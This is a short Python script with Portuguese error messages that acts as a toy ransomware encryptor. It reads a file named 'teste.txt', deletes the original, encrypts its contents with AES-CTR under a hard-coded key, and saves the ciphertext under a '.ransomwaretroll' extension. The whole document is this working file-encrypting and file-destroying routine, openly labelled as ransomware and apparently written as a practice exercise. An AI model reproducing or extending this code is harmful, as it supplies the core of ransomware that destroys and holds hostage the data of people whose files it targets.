import os
import pyaes

file_name = "teste.txt"

try:
    with open(file_name, "rb") as file:
        file_data = file.read()

    os.remove(file_name)

    key = b"testeransomwares"
    aes = pyaes.AESModeOfOperationCTR(key)

    crypto_data = aes.encrypt(file_data)

    base_name, extension = os.path.splitext(file_name)
    new_file_name = f"{base_name}.ransomwaretroll"

    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

except FileNotFoundError:
    print(f"Erro: Arquivo '{file_name}' não encontrado.")
except PermissionError:
    print(f"Erro: Permissões insuficientes para remover ou manipular o arquivo.")
except Exception as e:
    print(f"Erro inesperado: {str(e)}")
